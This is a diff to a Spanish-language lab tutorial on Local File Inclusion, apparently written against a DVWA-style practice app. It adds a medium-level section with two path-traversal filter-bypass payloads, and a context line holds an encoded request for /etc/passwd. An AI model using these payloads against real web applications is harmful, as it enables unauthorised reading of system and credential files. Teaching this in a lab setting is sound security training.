@@ -237,5 +237,11 @@ http://example.com/index.php?page=%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
 ```
 
 ## Laboratorio LFI - Nivel Medio
-Si ahora intentamos el ataque vemos que ya no se puede realizar un LFI tan sencillo:
-![](capturas/local-file-inclusion-lab1-10.png)
+Si aumentamos el nivel a medio y ahora intentamos el ataque vemos que ya no se puede realizar un LFI tan sencillo.
+Basic LFI and bypasses:
+```
+....//....//hackable/flags/fi.php
+....\/....\/hackable/flags/fi.php
+``
+![](capturas/local-file-inclusion-lab1-16.png)
+
